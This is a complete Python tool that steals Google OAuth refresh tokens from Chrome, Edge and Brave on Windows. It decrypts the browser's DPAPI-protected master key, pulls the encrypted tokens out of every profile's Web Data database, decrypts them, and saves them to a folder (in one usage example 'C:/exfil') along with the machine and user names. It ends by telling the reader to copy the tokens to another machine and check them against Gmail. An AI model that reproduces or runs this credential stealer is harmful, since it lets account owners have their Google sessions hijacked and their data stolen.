#!/usr/bin/env python3
"""
Google OAuth Token Extractor — Windows Desktop

Extracts 1//... Google OAuth refresh tokens from Chrome/Edge/Brave
on a Windows machine. Requires running as the logged-in user.

Usage:
    python extract_tokens_windows.py                    # Chrome only
    python extract_tokens_windows.py --all-browsers      # Chrome + Edge + Brave
    python extract_tokens_windows.py --output C:/exfil   # Custom output dir
    python extract_tokens_windows.py --browser chrome    # Single browser

Dependencies:
    pip install pycryptodome pypiwin32
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import argparse
from pathlib import Path
from datetime import datetime

try:
    import win32crypt
except ImportError:
    print("ERROR: pypiwin32 not installed. Run: pip install pypiwin32")
    sys.exit(1)

try:
    from Crypto.Cipher import AES
except ImportError:
    print("ERROR: pycryptodome not installed. Run: pip install pycryptodome")
    sys.exit(1)


# --- Configuration ---

BROWSER_PATHS = {
    "chrome": {
        "name": "Google Chrome",
        "user_data": os.environ.get("LOCALAPPDATA", "") + "\\Google\\Chrome\\User Data",
        "local_state": "Local State",
        "web_data": "Web Data",
    },
    "edge": {
        "name": "Microsoft Edge",
        "user_data": os.environ.get("LOCALAPPDATA", "") + "\\Microsoft\\Edge\\User Data",
        "local_state": "Local State",
        "web_data": "Web Data",
    },
    "brave": {
        "name": "Brave Browser",
        "user_data": os.environ.get("LOCALAPPDATA", "")
            + "\\BraveSoftware\\Brave-Browser\\User Data",
        "local_state": "Local State",
        "web_data": "Web Data",
    },
}

# Profile directories to scan (Chrome naming convention)
PROFILE_DIRS = ["Default"] + [f"Profile {i}" for i in range(1, 100)]


# --- Helpers ---

def get_master_key(local_state_path):
    """Read and decrypt Chrome's DPAPI-wrapped master encryption key."""
    if not local_state_path.exists():
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        state = json.load(f)

    encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
    if not encrypted_key_b64:
        return None

    # Base64 decode, strip 5-byte 'DPAPI' prefix
    encrypted_key = base64.b64decode(encrypted_key_b64)
    assert encrypted_key[:5] == b"DPAPI", "Expected DPAPI prefix on encrypted key"

    # Decrypt with Windows DPAPI (logged-in user context)
    master_key = win32crypt.CryptUnprotectData(
        encrypted_key[5:], None, None, None, 0
    )[1]

    return master_key


def decrypt_token(ciphertext, master_key):
    """
    Decrypt an AES-256-GCM encrypted token using Chrome's master key.

    Chrome format: [12-byte nonce][ciphertext][16-byte GCM tag]
    """
    nonce = ciphertext[:12]
    tag = ciphertext[-16:]
    ct = ciphertext[12:-16]

    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ct, tag)
    return plaintext.decode("utf-8")


def get_profile_name(profile_path):
    """Extract human-readable profile name from path."""
    return os.path.basename(profile_path)
# --- Main Extraction ---

def extract_browser(browser_key, output_dir):
    """
    Extract all OAuth tokens from a single Chromium browser.
    Returns list of (gaia_id, token, profile_name, source) tuples.
    """
    browser = BROWSER_PATHS[browser_key]
    user_data = Path(browser["user_data"])
    local_state = user_data / browser["local_state"]

    if not user_data.exists():
        print(f"  [!] {browser['name']} not found at {user_data}")
        return []

    print(f"\n  [{browser['name']}]")

    master_key = get_master_key(local_state)
    if master_key is None:
        print(f"    [!] No master key found in {local_state}")
        return []
    print(f"    [+] Master key: {master_key.hex()[:16]}... ({len(master_key)} bytes)")

    extracted = []

    for profile_dir in PROFILE_DIRS:
        web_data_path = user_data / profile_dir / browser["web_data"]
        if not web_data_path.exists():
            continue

        profile = get_profile_name(user_data / profile_dir)
        print(f"    [~] Scanning {profile}...", end=" ")

        # Copy Web Data to avoid SQLite lock issues
        tmp_fd, tmp_path = tempfile.mkstemp(suffix=".db")
        os.close(tmp_fd)
        try:
            shutil.copy2(str(web_data_path), tmp_path)

            conn = sqlite3.connect(tmp_path)
            cursor = conn.execute(
                "SELECT encrypted_token, account_id FROM token_service "
                "WHERE service LIKE '%google%'"
            )
            rows = cursor.fetchall()
            conn.close()

            if not rows:
                print("no tokens")
                continue

            print(f"{len(rows)} row(s)")
            for encrypted_blob, gaia_id in rows:
                try:
                    token = decrypt_token(bytes(encrypted_blob), master_key)
                    if token.startswith("1//"):
                        extracted.append((gaia_id, token, profile, browser_key))
                        safe_id = gaia_id.replace(":", "_").replace("/", "_")
                        tok_file = output_dir / f"token_{browser_key}_{profile}_{safe_id}.txt"
                        tok_file.write_text(token + "\n")
                        print(f"      [+] Gaia {gaia_id}: OK ({token[:30]}...)")
                    else:
                        print(f"      [!] Gaia {gaia_id}: unexpected format (starts {token[:10]}...)")
                except Exception as e:
                    print(f"      [!] Gaia {gaia_id}: decrypt failed - {e}")

        except sqlite3.Error as e:
            print(f"DB error: {e}")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    if not extracted:
        print(f"    [-] No valid 1// tokens found")
        return []
    else:
        print(f"    [+] Total: {len(extracted)} valid token(s) from {browser['name']}")
        return extracted

# --- Main Entry Point ---

def main():
    parser = argparse.ArgumentParser(
        description="Extract Google OAuth refresh tokens from Chromium browsers on Windows."
    )
    parser.add_argument(
        "--all-browsers", action="store_true",
        help="Scan Chrome, Edge, and Brave"
    )
    parser.add_argument(
        "--browser", choices=["chrome", "edge", "brave"], default="chrome",
        help="Which browser to scan (default: chrome)"
    )
    parser.add_argument(
        "--output", "-o", default="output_tokens",
        help="Output directory for extracted tokens (default: output_tokens)"
    )
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    if args.all_browsers:
        browsers_to_scan = list(BROWSER_PATHS.keys())
    else:
        browsers_to_scan = [args.browser]

    print("=" * 60)
    print(" Google OAuth Token Extractor — Windows")
    print(f" Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f" Output:  {output_dir.resolve()}")
    print("=" * 60)

    all_tokens = []

    for bkey in browsers_to_scan:
        tokens = extract_browser(bkey, output_dir)
        all_tokens.extend(tokens)

    # Write summary file
    summary_file = output_dir / "all_tokens.txt"
    with open(summary_file, "w") as f:
        f.write(f"# Google OAuth Tokens — Extracted {datetime.now().isoformat()}\n")
        f.write(f"# Source: {', '.join(browsers_to_scan)}\n")
        f.write(f"# Machine: {os.environ.get('COMPUTERNAME', '?')}\n")
        f.write(f"# User: {os.environ.get('USERNAME', '?')}\n")
        f.write("#" + "=" * 50 + "\n")
        for gaia_id, token, profile, browser in all_tokens:
            f.write(f"# === {browser.upper()} / {profile} / Gaia {gaia_id} ===\n")
            f.write(f"{token}\n\n")

    # Write report file
    report_file = output_dir / "extraction_report.txt"
    with open(report_file, "w") as f:
        f.write(f"# Extraction Report\n")
        f.write(f"Date: {datetime.now().isoformat()}\n")
        f.write(f"Machine: {os.environ.get('COMPUTERNAME', '?')}\n")
        f.write(f"User: {os.environ.get('USERNAME', '?')}\n\n")
        f.write(f"{'Browser':<10} {'Profile':<15} {'Gaia ID':<25} "
                f"{'Token Prefix':<35} Status\n")
        f.write("-" * 95 + "\n")
        for gaia_id, token, profile, browser in all_tokens:
            f.write(f"{browser:<10} {profile:<15} {gaia_id:<25} "
                    f"{token[:33]:<35} OK\n")

    print("\n" + "=" * 60)
    print(f" SUMMARY")
    print(f" Total tokens extracted: {len(all_tokens)}")
    print(f" Output directory:       {output_dir.resolve()}")
    print(f" Summary file:           {summary_file}")
    print(f" Report file:            {report_file}")
    print("=" * 60)

    if all_tokens:
        print("\n Next steps:")
        print("   1. Copy the tokens to your test machine")
        print("   2. Use test_token.py to validate them:")
        print(f"      python test_token.py {output_dir.resolve()}")
        print(f"      python test_token.py --check-gmail {output_dir.resolve()}")
        print(f"      python test_token.py --discover {output_dir.resolve()}")


if __name__ == "__main__":
    main()